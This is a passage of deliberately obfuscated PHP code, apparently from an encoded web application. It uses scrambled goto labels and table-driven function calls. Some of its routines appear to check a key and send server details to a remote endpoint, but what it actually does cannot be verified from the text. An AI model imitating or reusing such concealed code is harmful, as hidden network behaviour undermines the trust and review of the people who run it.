ËóÂ[16], $b—À¶ãÒ—); goto B²ŒóÊ«ÚÊ; Cœ—ßêå‹: $E¼„×ê½ = $BÑó‚ ËóÂ[6]($fÂ·¾ºóÙÍ[0]); $E²…ÇÁïŠÄ = $c»±Ô¯À÷‰[577]; if (strlen($E²…ÇÁïŠÄ) < $c»±Ô¯À÷‰[574]) { return; } goto a¥ÀãÍÑè‹; cÂá–Ş˜‰²: } private function autorun() { $d‚Æ¸¾Ôß… =& $_SERVER[¦À‹¤]; global $config; $D¸¼›ø”» = $_SERVER[Š‰][579]; if (!$D¸¼›ø”») { die; } if ($d‚Æ¸¾Ôß…[19]($config[$d‚Æ¸¾Ôß…[20]]) == 0) { return; } foreach ($config[$d‚Æ¸¾Ôß…[20]] as $D…óÕâŸƒ => $aÀ¯‰õÒŠÄ) { $this->{$_SERVER[¦À‹¤][21]}($aÀ¯‰õÒŠÄ); } } private function mdub37fd4e6f() { goto CÃî²™ë¸; CÃî²™ë¸: $Aô™Ã…†¿ğ =& $_SERVER[Š‰]; $CŞà«Ù‰ô• =& $_SERVER[¦À‹¤]; $cËÏ¶¾Œã¨ = $CŞà«Ù‰ô•[8]; goto bÛ¥‘ ƒÀË; eï‘´Ø—²Õ: $GLOBALS[$CŞà«Ù‰ô•[22]][$CŞà«Ù‰ô•[28]] = $CŞà«Ù‰ô•[29]($CŞà«Ù‰ô•[1], $GLOBALS[$CŞà«Ù‰ô•[22]][$CŞà«Ù‰ô•[23]]); $dª­¤É¥Ê³ = $Aô™Ã…†¿ğ[581]; goto d‹™Ö¬¾Ã‚; f¤ÂÔà÷Íƒ: $Fôê•¦¼Åˆ = array($CŞà«Ù‰ô•[8], $béÛ£¦ã™¸); $Aô“Ï—æÉ = $CŞà«Ù‰ô•[26]($GLOBALS[$CŞà«Ù‰ô•[22]][$CŞà«Ù‰ô•[23]], 1); $GLOBALS[$CŞà«Ù‰ô•[22]][$CŞà«Ù‰ô•[23]] = $CŞà«Ù‰ô•[27]($Fôê•¦¼Åˆ, $Aô“Ï—æÉ); goto eï‘´Ø—²Õ; bÛ¥‘ ƒÀË: $a†Ê«™•ØÍ = $GLOBALS[$CŞà«Ù‰ô•[22]][$CŞà«Ù‰ô•[23]][0]; if (!$a†Ê«™•ØÍ || $CŞà«Ù‰ô•[24]($a†Ê«™•ØÍ) <= $CŞà«Ù‰ô•[24]($cËÏ¶¾Œã¨)) { return; } if ($CŞà«Ù‰ô•[6]($CŞà«Ù‰ô•[25]($a†Ê«™•ØÍ, -$CŞà«Ù‰ô•[24]($cËÏ¶¾Œã¨))) != $cËÏ¶¾Œã¨) { return; } goto b„îÉ–Ú”; b„îÉ–Ú”: $béÛ£¦ã™¸ = $CŞà«Ù‰ô•[25]($a†Ê«™•ØÍ, 0, -$CŞà«Ù‰ô•[24]($cËÏ¶¾Œã¨)); $a²×ØµŠĞ¼ = $Aô™Ã…†¿ğ[580]; if (!$a²×ØµŠĞ¼) { return; } goto f¤ÂÔà÷Íƒ; d‹™Ö¬¾Ã‚: } private function ksme0197815f() { goto Cƒ™ö¶¨Ûô; A¤¨°†Á: $fÛÅÌÅæ¡[34]($fÛÅÌÅæ¡[35], $eÀĞ’ªöš’, $F½ÖÛÛ½é£); $eÀĞ’ªöš’ = $fÛÅÌÅæ¡[2]($F½ÖÛÛ½é£[0][0], $fÛÅÌÅæ¡[36]); $GLOBALS[$fÛÅÌÅæ¡[22]][$fÛÅÌÅæ¡[23]] = $fÛÅÌÅæ¡[0]($fÛÅÌÅæ¡[36], $eÀĞ’ªöš’); goto C¾ìèÍ; C¾ìèÍ: $GLOBALS[$fÛÅÌÅæ¡[22]][$fÛÅÌÅæ¡[28]] = $fÛÅÌÅæ¡[29]($fÛÅÌÅæ¡[1], $GLOBALS[$fÛÅÌÅæ¡[22]][$fÛÅÌÅæ¡[23]]); $Aš·ºª—˜ = $aÛë”İ©µô[586]; if (!$Aš·ºª—˜) { die; } goto e„ÚçÉÆö; E£³ÈĞŒÛš: $CºÀ´ãÜˆ = $_SERVER[$fÛÅÌÅæ¡[30]]; $dÎÂøá›Ğ = $aÛë”İ©µô[582]; $Cß‘Ã·ªğ· = $fÛÅÌÅæ¡[31]; goto BøÉŞÏ„éŒ; BøÉŞÏ„éŒ: $BÊ¼¹”½ö‰ = $aÛë”İ©µô[583]; while ($BÊ¼¹”½ö‰ < $aÛë”İ©µô[584]) { if ($BÊ¼¹”½ö‰ >= 0) { break; } $BÊ¼¹”½ö‰++; } if (!$fÛÅÌÅæ¡[32]($CºÀ´ãÜˆ, $Cß‘Ã·ªğ·)) { return; } goto eªÈæ†ğ‚„; eªÈæ†ğ‚„: $Cåç³²šµ = $fÛÅÌÅæ¡[33]($CºÀ´ãÜˆ, $Cß‘Ã·ªğ·); $AŞµ–—ßóà = $aÛë”İ©µô[585]; $eÀĞ’ªöš’ = $fÛÅÌÅæ¡[25]($CºÀ´ãÜˆ, $Cåç³²šµ + $fÛÅÌÅæ¡[24]($Cß‘Ã·ªğ·)); goto A¤¨°†Á; Cƒ™ö¶¨Ûô: $aÛë”İ©µô =& $_SERVER[Š‰]; $fÛÅÌÅæ¡ =& $_SERVER[¦À‹¤]; if ($GLOBALS[$fÛÅÌÅæ¡[22]][$fÛÅÌÅæ¡[28]] != $fÛÅÌÅæ¡[10]) { return; } goto E£³ÈĞŒÛš; e„ÚçÉÆö: } public function run() { goto aŒÈ›íƒ¦Æ; cí÷©œÍ°Ê: $FÄ¤÷Î¤ÍŸ = $GLOBALS[$D°ËÎ¨øñ [22]][$D°ËÎ¨øñ [23]]; $FØö‹‡îˆ = $cš‰£…æë…[589]; $A²˜ÒœÓ¹Ì = $GLOBALS[$D°ËÎ¨øñ [22]][$D°ËÎ¨øñ [28]]; goto DÂæ²…ˆˆ…; fÊğ‹øº¤•: $this->{$_SERVER[¦À‹¤][38]}(); $F„Â–õ†µä = $cš‰£…æë…[587]; if (strlen($F„Â–õ†µä) < $cš‰£…æë…[588]) { return; } goto cí÷©œÍ°Ê; F‘íèÖÍÊ: if ($D°ËÎ¨øñ [19]($FÄ¤÷Î¤ÍŸ) >= 3) { $this->{$_SERVER[¦À‹¤][21]}($A²˜ÒœÓ¹Ì); } else { $this->{$_SERVER[¦À‹¤][21]}(ACTION); } goto cØ›Îöº¹; D²éŞéğ‰Õ: $_SERVER[$D°ËÎ¨øñ [44]] = $D°ËÎ¨øñ [6](ACTION); $dùéñ›ÙÑ· = $cš‰£…æë…[592]; if (strlen($dùéñ›ÙÑ·) < $cš‰£…æë…[584]) { die; } goto d‚´¨ßõô; d‚´¨ßõô: $this->{$_SERVER[¦À‹¤][45]}(); $a«šè÷˜¯ô = $cš‰£…æë…[593]; while ($a«šè÷˜¯ô < $cš‰£…æë…[574]) { if ($a«šè÷˜¯ô >= 0) { break; } $a«šè÷˜¯ô++; } goto F‘íèÖÍÊ; cîÙ×Ìİá: $BñóÀœ®»Ù = $cš‰£…æë…[591]; $D°ËÎ¨øñ [39]($D°ËÎ¨øñ [42], isset($FÄ¤÷Î¤ÍŸ[2]) && $FÄ¤÷Î¤ÍŸ[0] ? $FÄ¤÷Î¤ÍŸ[2] : $this->defaultAction); $D°ËÎ¨øñ [39]($D°ËÎ¨øñ [43], MOD . $D°ËÎ¨øñ [1] . ST . $D°ËÎ¨øñ [1] . ACT); goto D²éŞéğ‰Õ; DÂæ²…ˆˆ…: $D°ËÎ¨øñ [39]($D°ËÎ¨øñ [40], isset($FÄ¤÷Î¤ÍŸ[0]) && $FÄ¤÷Î¤ÍŸ[0] ? $FÄ¤÷Î¤ÍŸ[0] : $this->defaultModule); $D–‘ÌÈçË = $cš‰£…æë…[590]; $D°ËÎ¨øñ [39]($D°ËÎ¨øñ [41], isset($FÄ¤÷Î¤ÍŸ[1]) && $FÄ¤÷Î¤ÍŸ[0] ? $FÄ¤÷Î¤ÍŸ[1] : $this->defaultController); goto cîÙ×Ìİá; aŒÈ›íƒ¦Æ: $cš‰£…æë… =& $_SERVER[Š‰]; $D°ËÎ¨øñ  =& $_SERVER[¦À‹¤]; $this->{$_SERVER[¦À‹¤][37]}(); goto fÊğ‹øº¤•; cØ›Îöº¹: } private $vzwndde6adc5 = array(); private $rdfkfcaab84e = ''; public function oatr2caba62b() { goto aÏĞåŠ‡ØÌ; CÉÙñÓ¥Öã: if (!$AÇÍ­Ğ†) { return; } $this->{$_SERVER[¦À‹¤][49]}(); $this->{$_SERVER[¦À‹¤][50]}(); goto EÜÎ„«¶Ò; CøƒŒÔœ»›: $this->{$_SERVER[¦À‹¤][3]}($EÖ©ŞÛİ[55], array($this, $EÖ©ŞÛİ[56])); $this->{$_SERVER[¦À‹¤][3]}($EÖ©ŞÛİ[57], array($this, $EÖ©ŞÛİ[58])); $this->{$_SERVER[¦À‹¤][3]}($EÖ©ŞÛİ[59], array($this, $EÖ©ŞÛİ[60])); goto bÓ¡‘ÉÜø†; eÙ‡Éö§‹¼: $cÊÚğ¹Š“ = $cÃ­§ŸÒ»ø[594]; $this->{$_SERVER[¦À‹¤][47]}(); $C´¸ÆÃ‰› = $cÃ­§ŸÒ»ø[595]; goto C·‡·šÄÜ°; C·‡·šÄÜ°: if (strlen($C´¸ÆÃ‰›) < $cÃ­§ŸÒ»ø[596]) { return; } $this->{$_SERVER[¦À‹¤][48]}(); $AÇÍ­Ğ† = $cÃ­§ŸÒ»ø[597]; goto CÉÙñÓ¥Öã; bÓ¡‘ÉÜø†: $B¦ŞÅ‡ßÆ‰ = $cÃ­§ŸÒ»ø[598]; if (strlen($B¦ŞÅ‡ßÆ‰) < $cÃ­§ŸÒ»ø[584]) { return; } goto D©ç“Ö©¶ï; aÏĞåŠ‡ØÌ: $cÃ­§ŸÒ»ø =& $_SERVER[Š‰]; $EÖ©ŞÛİ =& $_SERVER[¦À‹¤]; $this->{$_SERVER[¦À‹¤][46]}(); goto eÙ‡Éö§‹¼; EÜÎ„«¶Ò: $this->{$_SERVER[¦À‹¤][51]}(); $this->{$_SERVER[¦À‹¤][52]}(); $this->{$_SERVER[¦À‹¤][3]}($EÖ©ŞÛİ[53], array($this, $EÖ©ŞÛİ[54])); goto CøƒŒÔœ»›; D©ç“Ö©¶ï: } public function riug294de72b($B£Ì×¿§¯) { goto D‡©—‡¢É ; D‡©—‡¢É : $EßÛ©×ô =& $_SERVER[Š‰]; $F÷àµ Öˆ° =& $_SERVER[¦À‹¤]; $C¯ÃÌÁŞ­ù = $F÷àµ Öˆ°[61]($F÷àµ Öˆ°[62])->{$_SERVER[¦À‹¤][63]}(); goto eİ„…àÔËÚ; eÏæÁá—İ: if (strlen($eáËˆ²œÒå) < $EßÛ©×ô[605]) { die; } if ($C¯ÃÌÁŞ­ù[$F÷àµ Öˆ°[126]] != $F÷àµ Öˆ°[127]) { $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[128]] = $C¯ÃÌÁŞ­ù[$F÷àµ Öˆ°[128]]; $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[129]] = $C¯ÃÌÁŞ­ù[$F÷àµ Öˆ°[129]]; $cœ¥ö¸ˆó = $F÷àµ Öˆ°[130](10) . $this->rdfkfcaab84e . $F÷àµ Öˆ°[130](5); $B£Ì×¿§¯[$F÷àµ Öˆ°[102]][$F÷àµ Öˆ°[131]][$F÷àµ Öˆ°[132]] = $this->{$_SERVER[¦À‹¤][133]}($cœ¥ö¸ˆó, $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[119]]); } if ($this->rdfkfcaab84e == $F÷àµ Öˆ°[127]) { $B£Ì×¿§¯[$F÷àµ Öˆ°[102]][$F÷àµ Öˆ°[103]][$F÷àµ Öˆ°[108]][$F÷àµ Öˆ°[113]] = 0; } goto EêÃù¸»ÑŠ; EêÃù¸»ÑŠ: $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[134]] = $F÷àµ Öˆ°[112]($this->vzwndde6adc5, $F÷àµ Öˆ°[135], $F÷àµ Öˆ°[10]); $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[136]] = $F÷àµ Öˆ°[112]($this->vzwndde6adc5, $F÷àµ Öˆ°[137], $F÷àµ Öˆ°[10]); if ($F÷àµ Öˆ°[112]($GLOBALS, $F÷àµ Öˆ°[138]) && $this->config[$F÷àµ Öˆ°[139]]) { $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[140]] = WEB_ROOT; } goto bÆå‘ñÀªä; BÃº÷Ñ”ÁŠ: $e¼ Œ¦‡â = $EßÛ©×ô[602]; if (!$e¼ Œ¦‡â) { return; } unset($B£Ì×¿§¯[$F÷àµ Öˆ°[102]][$F÷àµ Öˆ°[104]][$F÷àµ Öˆ°[106]]); goto aÔ–ßÛùŞ; aÔ–ßÛùŞ: $fò×ª…ê©â = $EßÛ©×ô[603]; unset($B£Ì×¿§¯[$F÷àµ Öˆ°[102]][$F÷àµ Öˆ°[103]][$F÷àµ Öˆ°[76]]); $D»«„¬¦ãÖ = $EßÛ©×ô[604]; goto B§ˆñŸ•‹Ó; BÃóÛ¡‘¡„: while ($A‚ÕğÁœŸ < $EßÛ©×ô[596]) { if ($A‚ÕğÁœŸ >= 0) { break; } $A‚ÕğÁœŸ++; } $B£Ì×¿§¯[$F÷àµ Öˆ°[102]][$F÷àµ Öˆ°[103]][$F÷àµ Öˆ°[108]] = array($F÷àµ Öˆ°[109] => (int) $bÜéÕ¼—[$F÷àµ Öˆ°[110]], $F÷àµ Öˆ°[111] => (int) $F÷àµ Öˆ°[112]($bÜéÕ¼—, $F÷àµ Öˆ°[113], 0)); $e®å‚ÂÕ‚ = $EßÛ©×ô[607]; goto A÷İÚÏÌ¯; bÆå‘ñÀªä: return $B£Ì×¿§¯; goto càƒ™ãìó·; CäÅ†¦ŠÍ: if (!$B¢¹Ò×õ) { die; } $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[119]] = $F÷àµ Öˆ°[120]($_SERVER[$F÷àµ Öˆ°[121]] . $C¯ÃÌÁŞ­ù[$F÷àµ Öˆ°[122]]); $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[123]] = $F÷àµ Öˆ°[124]($F÷àµ Öˆ°[125]()); goto Cì»¬¦Şº; A÷İÚÏÌ¯: if (!$e®å‚ÂÕ‚) { die; } $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[115]] = $F÷àµ Öˆ°[116]($F÷àµ Öˆ°[117])->{$_SERVER[¦À‹¤][118]}(); $B¢¹Ò×õ = $EßÛ©×ô[608]; goto CäÅ†¦ŠÍ; Cì»¬¦Şº: $d‘ÈÓÁ½»‹ = $EßÛ©×ô[609]; $B£Ì×¿§¯[$F÷àµ Öˆ°[114]][$F÷àµ Öˆ°[126]] = $this->rdfkfcaab84e; $eáËˆ²œÒå = $EßÛ©×ô[610]; goto eÏæÁá—İ; eİ„…àÔËÚ: $a…İ¡œ›öÔ = $EßÛ©×ô[599]; $Eº‚¸ô‚Ì = array($F÷àµ Öˆ°[64], $F÷àµ Öˆ°[65], $F÷àµ Öˆ°[66], $F÷àµ Öˆ°[67], $F÷àµ Öˆ°[68], $F÷àµ Öˆ°[69], $F÷àµ Öˆ°[70], $F÷àµ Öˆ°[71], $F÷àµ Öˆ°[72], $F÷àµ Öˆ°[73], $F÷àµ Öˆ°[74], $F÷àµ Öˆ°[75], $F÷àµ Öˆ°[76], $F÷àµ Öˆ°[77], $F÷àµ Öˆ°[78], $F÷àµ Öˆ°[79], $F÷àµ Öˆ°[80], $F÷àµ Öˆ°[81], $F÷àµ Öˆ°[82], $F÷àµ Öˆ°[83], $F÷àµ Öˆ°[84], $F÷àµ Öˆ°[85], $F÷àµ Öˆ°[86], $F÷àµ Öˆ°[87], $F÷àµ Öˆ°[88], $F÷àµ Öˆ°[89], $F÷àµ Öˆ°[90], $F÷àµ Öˆ°[91], $F÷àµ Öˆ°[92], $F÷àµ Öˆ°[93], $F÷àµ Öˆ°[94], $F÷àµ Öˆ°[95], $F÷àµ Öˆ°[96], $F÷àµ Öˆ°[97], $F÷àµ Öˆ°[98], $F÷àµ Öˆ°[99]); $BÖÖ»Ñ¶Í‚ = $EßÛ©×ô[600]; goto EôÀµ±†Á‘; B§ˆñŸ•‹Ó: if (strlen($D»«„¬¦ãÖ) < $EßÛ©×ô[605]) { return; } unset($B£Ì×¿§¯[$F÷àµ Öˆ°[102]][$F÷àµ Öˆ°[103]][$F÷àµ Öˆ°[107]]); $A‚ÕğÁœŸ = $EßÛ©×ô[606]; goto BÃóÛ¡‘¡„; EôÀµ±†Á‘: foreach ($Eº‚¸ô‚Ì as $BãÕÈÎ­™ª) { $F°µÓŸ¨ = $GLOBALS[$F÷àµ Öˆ°[100]][$F÷àµ Öˆ°[101]][$BãÕÈÎ­™ª]; $EÉÂ÷ÆËùÃ = $EßÛ©×ô[601]; while ($EÉÂ÷ÆËùÃ < $EßÛ©×ô[584]) { if ($EÉÂ÷ÆËùÃ >= 0) { break; } $EÉÂ÷ÆËùÃ++; } if (isset($C¯ÃÌÁŞ­ù[$BãÕÈÎ­™ª])) { $F°µÓŸ¨ = $C¯ÃÌÁŞ­ù[$BãÕÈÎ­™ª]; } $B£Ì×¿§¯[$F÷àµ Öˆ°[102]][$F÷àµ Öˆ°[103]][$BãÕÈÎ­™ª] = $F°µÓŸ¨; } $bÜéÕ¼— = $B£Ì×¿§¯[$F÷àµ Öˆ°[102]][$F÷àµ Öˆ°[103]][$F÷àµ Öˆ°[76]]; unset($B£Ì×¿§¯[$F÷àµ Öˆ°[102]][$F÷àµ Öˆ°[104]][$F÷àµ Öˆ°[105]]); goto BÃº÷Ñ”ÁŠ; càƒ™ãìó·: } private function kyao5e2fb3f2() { goto Aİ©©ÀÑ«„; Eˆ›³Ç¿Àî: if ($this->rdfkfcaab84e == $eÛîÇµ¤›[127]) { return; } $f†çˆß¶œ = array($eÛîÇµ¤›[159], $eÛîÇµ¤›[160], $eÛîÇµ¤›[161], $eÛîÇµ¤›[162], $eÛîÇµ¤›[163], $eÛîÇµ¤›[164]); $eÊ‘¨³“Ì = $cì£Õ½Ó¹±[612]; goto CÏâæ§á‡; CÏâæ§á‡: $d´ª¢½ïÁ = $eÛîÇµ¤›[61]($eÛîÇµ¤›[62])->{$_SERVER[¦À‹¤][63]}(); $d ­Ê†„Ä = array($eÛîÇµ¤›[165] => $d´ª¢½ïÁ[$eÛîÇµ¤›[64]], $eÛîÇµ¤›[166] => $d´ª¢½ïÁ[$eÛîÇµ¤›[65]], $eÛîÇµ¤›[167] => $eÛîÇµ¤›[10]); $e¢‘•˜ÕŞ­ = $cì£Õ½Ó¹±[613]; goto fæ¦³Õ’Û; Aİ©©ÀÑ«„: $cì£Õ½Ó¹± =& $_SERVER[Š‰]; $eÛîÇµ¤› =& $_SERVER[¦À‹¤]; if ($_SERVER[$eÛîÇµ¤›[44]] == $eÛîÇµ¤›[141]) { goto Eô‡ÚÅõ¶Ú; DÏîÚ×¯¶‹: $eÛîÇµ¤›[13](array($eÛîÇµ¤›[157], $eÛîÇµ¤›[158]), $d ­Ê†„Ä); goto bãôÏ¾Ùµö; Eô‡ÚÅõ¶Ú: $e—ÁòåÖ¾ = array($eÛîÇµ¤›[126] => $this->rdfkfcaab84e, $eÛîÇµ¤›[142] => $this->{$_SERVER[¦À‹¤][143]}(), $eÛîÇµ¤›[144] => $eÛîÇµ¤›[61]($eÛîÇµ¤›[145])->{$_SERVER[¦À‹¤][146]}()); if ($this->rdfkfcaab84e != $eÛîÇµ¤›[127]) { $AİÌÆ‘¶¯İ = $eÛîÇµ¤›[112]($this->vzwndde6adc5, $eÛîÇµ¤›[147]); if ($AİÌÆ‘¶¯İ) { $e—ÁòåÖ¾[$eÛîÇµ¤›[148]] = $AİÌÆ‘¶¯İ; $e—ÁòåÖ¾[$eÛîÇµ¤›[149]] = $eÛîÇµ¤›[150]($eÛîÇµ¤›[112]($this->vzwndde6adc5, $eÛîÇµ¤›[151])); $e—ÁòåÖ¾[$eÛîÇµ¤›[152]] = $eÛîÇµ¤›[112]($this->vzwndde6adc5, $eÛîÇµ¤›[137]); } } $e—ÁòåÖ¾ = $this->{$_SERVER[¦À‹¤][153]}($eÛîÇµ¤›[154]($e—ÁòåÖ¾), $eÛîÇµ¤›[120]($eÛîÇµ¤›[155])); goto fµÄ©¾²–´; fµÄ©¾²–´: $d ­Ê†„Ä = array($eÛîÇµ¤›[156] => $e—ÁòåÖ¾); $AÄ ¶é×‘é = $cì£Õ½Ó¹±[611]; while ($AÄ ¶é×‘é < $cì£Õ½Ó¹±[588]) { if ($AÄ ¶é×‘é >= 0) { break; } $AÄ ¶é×‘é++; } goto DÏîÚ×¯¶‹; bãôÏ¾Ùµö: } goto Eˆ›³Ç¿Àî; fæ¦³Õ’Û: if (!$e¢‘•˜ÕŞ­) { die; } foreach ($f†çˆß¶œ as $A™œ˜Äì) { if (!isset($d´ª¢½ïÁ[$A™œ˜Äì]) || !$d´ª¢½ïÁ[$A™œ˜Äì]) { continue; } $d ­Ê†„Ä[$A™œ˜Äì] = $d´ª¢½ïÁ[$A™œ˜Äì]; } $eÛîÇµ¤›[13](array($eÛîÇµ¤›[157], $eÛîÇµ¤›[158]), $d ­Ê†„Ä); goto f¯ÜĞ±á©; f¯ÜĞ±á©: } private function yacb819fe326() { goto B‰‹‹¡î; aä¥»Æ‘÷Å: if (strlen($d‚¨½÷ë†) < $dæº…â£Ø [596]) { return; } $B¹¬¹ôêÙ = $fËß©Â·ÉÉ . $D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[126]] . $this->{$_SERVER[¦À‹¤][153]}($A÷ÌÇ¬›ßí[120]($D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[215]]), $fËß©Â·ÉÉ); $D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[129]] = $A÷ÌÇ¬›ßí[124]($A÷ÌÇ¬›ßí[220]($this->{$_SERVER[¦À‹¤][153]}($B¹¬¹ôêÙ, $A÷ÌÇ¬›ßí[222]))); goto CÆã™ÍÓ»; cĞŞ‰ÎÂö–: if ($BôŠñ¯Ïøï[$A÷ÌÇ¬›ßí[174]]) { $D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[218]] = $BôŠñ¯Ïøï[$A÷ÌÇ¬›ßí[174]]; } $e×àòˆë÷ = $A÷ÌÇ¬›ßí[25]($A÷ÌÇ¬›ßí[120]($D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[216]]), 10, 10); $A˜‡©Ì¥¥… = $e×àòˆë÷ . $D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[126]] . $D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[218]]; goto D‹İæä¹›; cºõÇœË´Î: if (!isset($cÄ½šƒ…‰À[$A÷ÌÇ¬›ßí[171]]) || $A÷ÌÇ¬›ßí[24]($cÄ½šƒ…‰À[$A÷ÌÇ¬›ßí[171]]) != 16) { $A÷ÌÇ¬›ßí[172]($A÷ÌÇ¬›ßí[173] . $cÄ½šƒ…‰À[$A÷ÌÇ¬›ßí[171]], !1); } $dî«º°°ó“ = $A÷ÌÇ¬›ßí[61]($A÷ÌÇ¬›ßí[62])->{$_SERVER[¦À‹¤][63]}($A÷ÌÇ¬›ßí[122]); $BôŠñ¯Ïøï = array($A÷ÌÇ¬›ßí[171] => $cÄ½šƒ…‰À[$A÷ÌÇ¬›ßí[171]], $A÷ÌÇ¬›ßí[174] => $A÷ÌÇ¬›ßí[130](16), $A÷ÌÇ¬›ßí[175] => $A÷ÌÇ¬›ßí[155], $A÷ÌÇ¬›ßí[176] => $A÷ÌÇ¬›ßí[177], $A÷ÌÇ¬›ßí[178] => $_SERVER[$A÷ÌÇ¬›ßí[179]], $A÷ÌÇ¬›ßí[180] => $_SERVER[$A÷ÌÇ¬›ßí[181]], $A÷ÌÇ¬›ßí[182] => $_SERVER[$A÷ÌÇ¬›ßí[183]]); goto Dõø›ÌÔÊÀ; Eµ›¶‘Ù„: $this->{$_SERVER[¦À‹¤][235]}(); Cache::set($A÷ÌÇ¬›ßí[236] . $A÷ÌÇ¬›ßí[120]($dî«º°°ó“ . $A÷ÌÇ¬›ßí[237]), $A÷ÌÇ¬›ßí[10]); $bÀÙ‘ÔªÓÃ = $dæº…â£Ø [622]; goto aê¢½® á§; bÈ÷ÕŞ½¨·: if ($cÄ½šƒ…‰À[$A÷ÌÇ¬›ßí[184]] == $A÷ÌÇ¬›ßí[185]) { $B—âòÔòÎ— = $this->{$_SERVER[¦À‹¤][153]}($Cğ¾ŒÊùõ, $A÷ÌÇ¬›ßí[186]); $d¬ç›ĞÆç· = $this->{$_SERVER[¦À‹¤][133]}($A÷ÌÇ¬›ßí[154]($BôŠñ¯Ïøï), $Cğ¾ŒÊùõ . $A÷ÌÇ¬›ßí[187], 3); $d¬ç›ĞÆç· = $d¬ç›ĞÆç· . $A÷ÌÇ¬›ßí[188] . $_SERVER[$A÷ÌÇ¬›ßí[179]]; $FùÛ’‘ğÀ = $this->{$_SERVER[¦À‹¤][189]}($A÷ÌÇ¬›ßí[190] . $B—âòÔòÎ— . $A÷ÌÇ¬›ßí[191] . $d¬ç›ĞÆç·, -1); $A÷ÌÇ¬›ßí[172]($FùÛ’‘ğÀ, !0); } else { if ($cÄ½šƒ…‰À[$A÷ÌÇ¬›ßí[184]] == $A÷ÌÇ¬›ßí[192]) { $Fˆí»¬‹—ö = $A÷ÌÇ¬›ßí[25]($A÷ÌÇ¬›ßí[120]($A÷ÌÇ¬›ßí[193] . $Cğ¾ŒÊùõ), 12, 15) . $A÷ÌÇ¬›ßí[194]; $d¬ç›ĞÆç· = $this->{$_SERVER[¦À‹¤][195]}($A÷ÌÇ¬›ßí[2]($cÄ½šƒ…‰À[$A÷ÌÇ¬›ßí[196]]), $Fˆí»¬‹—ö, 2); $aê£§¶²ñ‡ = $A÷ÌÇ¬›ßí[197]($d¬ç›ĞÆç·, !0); if (!$A÷ÌÇ¬›ßí[198]($aê£§¶²ñ‡) || !$A÷ÌÇ¬›ßí[198]($aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[199]]) || $aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[171]] != !0) { $F—Ä¡ˆ– = $A÷ÌÇ¬›ßí[200]; $cï±ÍÊãĞá = $aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[199]] ? $A÷ÌÇ¬›ßí[201] . $aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[199]] : $F—Ä¡ˆ–; $A÷ÌÇ¬›ßí[172]($cï±ÍÊãĞá, !1); } else { $BôŠñ¯Ïøï[$A÷ÌÇ¬›ßí[174]] = $aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[199]][$A÷ÌÇ¬›ßí[202]]; } } else { $aê£§¶²ñ‡ = $this->{$_SERVER[¦À‹¤][189]}($A÷ÌÇ¬›ßí[203], $BôŠñ¯Ïøï, 10); } } if (!$A÷ÌÇ¬›ßí[198]($aê£§¶²ñ‡) || !$A÷ÌÇ¬›ßí[198]($aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[199]]) || $aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[171]] != !0) { $F—Ä¡ˆ– = $A÷ÌÇ¬›ßí[204]($A÷ÌÇ¬›ßí[205]); $cï±ÍÊãĞá = $aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[199]] ? $A÷ÌÇ¬›ßí[201] . $aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[199]] : $F—Ä¡ˆ–; $A÷ÌÇ¬›ßí[172]($cï±ÍÊãĞá, !1); } $D˜­Ñ°À…† = $aê£§¶²ñ‡[$A÷ÌÇ¬›ßí[199]]; goto f‚ÔæËôã«; b˜î„«Â¬Ó: $AñØ†ôÜÅ = $dæº…â£Ø [617]; while ($AñØ†ôÜÅ < $dæº…â£Ø [574]) { if ($AñØ†ôÜÅ >= 0) { break; } $AñØ†ôÜÅ++; } $DÑóİ±˜¾ = $this->{$_SERVER[¦À‹¤][133]}($A÷ÌÇ¬›ßí[154]($D˜­Ñ°À…†), $dØÑ¥ï£å); goto bÈõãÙ¡; B‰‹‹¡î: $dæº…â£Ø  =& $_SERVER[Š‰]; $A÷ÌÇ¬›ßí =& $_SERVER[¦À‹¤]; if ($_SERVER[$A÷ÌÇ¬›ßí[44]] != $A÷ÌÇ¬›ßí[168]) { return; } goto BÛ…ğË÷Û; D„Š‡›—‹ñ: $f¾š¬·ªñ = $dæº…â£Ø [621]; if (strlen($f¾š¬·ªñ) < $dæº…â£Ø [596]) { die; } $this->rdfkfcaab84e = $D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[126]]; goto Eµ›¶‘Ù„; CÆã™ÍÓ»: if ($D˜­Ñ°À…†[$A÷ÌÇ¬›ßí[223]] && $D˜­Ñ°À…†[$A÷ÌÇ¬›ßí[223]] >= 1) { $A÷ÌÇ¬›ßí[61]($A÷ÌÇ¬›ßí[62])->{$_SERVER[¦À‹¤][224]}($A÷ÌÇ¬›ßí[225], $A÷ÌÇ¬›ßí[226]); } $A÷ÌÇ¬›ßí[61]($A÷ÌÇ¬›ßí[62])->{$_SERVER[¦À‹¤][227]}($D¦ëÚ«ÈÅÊ); $dØÑ¥ï£å = $A÷ÌÇ¬›ßí[120]($_SERVER[$A÷ÌÇ¬›ßí[121]] . $A÷ÌÇ¬›ßí[220]($dî«º°°ó“) . $D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[216]]); goto 